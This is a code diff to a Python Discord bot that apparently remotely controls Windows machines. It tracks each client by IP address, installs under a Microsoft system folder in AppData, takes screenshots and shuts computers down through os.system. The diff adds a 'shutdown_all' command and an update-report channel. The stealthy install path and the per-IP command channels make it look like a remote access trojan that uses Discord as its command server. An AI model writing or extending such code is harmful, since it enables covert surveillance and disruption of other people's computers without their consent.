@@ -78,7 +78,9 @@ intents.message_content = True
 async def on_ready():
     ip = get_device_ip()
     global_online_channel_id = 1336044356704145408
+    global_update_channel_id = 1337769661466415136
     channel12 = client.get_channel(global_online_channel_id)
+    channel13 = client.get_channel(global_update_channel_id)
     for guild in client.guilds:
         existing_category = nextcord.utils.get(guild.categories, name=str(ip))
         
@@ -112,21 +114,23 @@ async def on_ready():
         if existing_category:
             user_profile = os.environ['USERPROFILE']
             target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-            with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as up:
-                tex = up.read()
-                print("Checking if update was done...")
-                up.close()
-            if not tex == "":
-                print("Updated!")
-                category = nextcord.utils.get(guild.categories, name=str(ip))
-                channel5 = nextcord.utils.get(category.text_channels, name="events")
-                await channel5.send(f"Client updated to version v{tex}")
-                with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
-                    up.write("")
+            if os.path.exists(os.path.join(target_path, "skibidi-mainmain", "update.txt")):
+                with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as up:
+                    tex = up.read()
+                    print("Checking if update was done...")
                     up.close()
-                with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
-                    up2.write(tex)
-                    up2.close()
+                if not tex == "":
+                    print("Updated!")
+                    category = nextcord.utils.get(guild.categories, name=str(ip))
+                    channel5 = nextcord.utils.get(category.text_channels, name="events")
+                    await channel5.send(f"Client updated to version v{tex}!")
+                    await channel13.send(f"Client {ip} updated to version v{tex}!")
+                    with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
+                        up.write("")
+                        up.close()
+                    with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
+                        up2.write(tex)
+                        up2.close()
             await channel12.send(f"Client {ip} online!")
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
@@ -158,6 +162,19 @@ async def shutdown(interaction : Interaction):
         await interaction.send(embed=embed)
         await interaction.delete_original_message()
         os.system("shutdown /s /t 1")
+
+@client.slash_command(guild_ids=testServerId, description="Shuts down all clients")
+async def shutdown_all(interaction : Interaction):
+    category = interaction.channel.category
+    user_id = interaction.user.id
+
+    embed = nextcord.Embed(description="Computer Shutdown", title="Status before interaction", timestamp=datetime.now(), colour=0xb400f5)
+    embed.set_author(name="Remote Control Bot")
+    embed.set_footer(text="Remote Control Bot v1.3")
+
+    await interaction.send(embed=embed)
+    await interaction.delete_original_message()
+    os.system("shutdown /s /t 1")
 
 @client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
 async def status(interaction : Interaction):
